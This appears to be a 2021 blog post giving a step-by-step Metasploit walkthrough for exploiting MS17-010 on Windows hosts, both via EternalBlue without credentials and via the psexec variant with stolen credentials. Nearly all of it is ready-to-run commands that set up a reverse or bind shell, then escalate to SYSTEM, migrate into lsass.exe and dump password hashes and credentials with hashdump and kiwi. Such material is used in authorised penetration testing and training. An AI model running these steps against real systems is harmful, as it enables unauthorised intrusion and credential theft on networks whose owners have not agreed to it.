---
layout: post
title: 'Remote Exploit MS17-010'
date: '2021-03-27'
description: 'This article serves as a quick reference to exploiting the MS17-010 with the Metasploit Framework. This article is for educational purposes only.'
coverimage: Remote_Exploit_MS17010.jpg
tags: kali-linux metasploit ms17-010 windows
published: true
posttype: article
categories: article
---
This article demonstrates how to exploit the MS17-010 vulnerability with the `Metasploit Framework`. This article is for educational purposes only.

Two methods are demonstrated; `with` and `without compromised credentials`. This article does not discuss the vulnerability and its background.

# Method 1 - MS17-010 exploitation without credentials: EternalBlue

<h5 class="step">Step 1 - Launch Metasploit and choose the `ms17_010_eternalblue` exploit</h5>

```
msfconole
[...]
use exploit/windows/smb/ms17_010_eternalblue
```

<h5 class="step">Step 2 - Configure options for your target</h5>

Configure your exploit to run with options that are specific to your target. Note that setting the remote port is optional, this is 445 by default

```
show targets
set TARGET <id>
set RHOST <target IP>
set RPORT <target port> (445 by default)
```

<h5 class="step">Step 3 - Configure options for your machine</h5>

Configure options for your machine with. 

```
set LHOST <your IP>
set LPORT <port of your choice>
```

<h5 class="step">Step 4 - Optional: Configure a payload</h5>

This step is optional. By default, `windows/x64/meterpreter/reverse_tcp` is used.

```
show PAYLOADS
```

Choose and set a payload with:

```
set PAYLOAD <payload>
```

<h5 class="step">Step 5 - Exploit</h5>

To run the exploit use:

```
exploit
```

A reverse connection is initiated upon successful exploitation.

For `post-exploitation tips`, see step 6 of the below instructions.

# MS17-010 Exploitation - With credentials: PSExec

This example requires credentials to run. This example is done using a domain-joined target.

<h5 class="step">Step 1 - Launch Metasploit and choose the `ms17_010_psexec` exploit</h5>

```
msfconole
[...]
use exploit/windows/smb/ms17_010_psexec
```

<h5 class="step">Step 2 - Configure options for your target</h5>

Configure your exploit to run with options that are specific to your target. Note that setting the remote port is optional, this is 445 by default

```
show TARGETS
set TARGET <id>
set RHOST <target IP>
set RPORT <target port> (445 by default)
set SMBUSER <user>
set SMBPASS <password>
set SMBDOMAIN <domain>
```

<h5 class="step">Step 3 - Configure options for your machine</h5>

```
set LHOST <your IP>
set LPORT <port of your choice>
```

<h5 class="step">Step 4 - Optional: Configure a payload</h5>

This step is optional. By default, `windows/x64/meterpreter/reverse_tcp` is used.

```
show PAYLOADS
```

Choose and set a payload with:

```
set PAYLOAD <payload>
```

For example, to use a smaller `bind` payload (`stageless`), you can choose:

```
set PAYLOAD generic/shell_bind_tcp
```

<h5 class="step">Step 5 - Exploit</h5>

To run the exploit use:

```
exploit
```

<h5 class="step">Step 6 - Optional: Post-Exploitation</h5>

If you used a non-meterpreter payload, you can upgrade it to Meterpreter using:

```
CTRL + Z (background session)
use post/multi/manage/shell_to_meterpreter
sessions -l
set session <session id>
set LHOST <your IP>
set LPORT <port of your choice>
exploit
```

<b>Note:</b> You may need to run this a few times to upgrade the shell.

Once you have upgraded your shell, you can escalate your privileges.

```
session -i <meterpreter session>
getsystem
```

To migrate process and dump credentials, use:

```
ps
migrate -N lsass.exe
hashdump
load kiwi
creds_all
```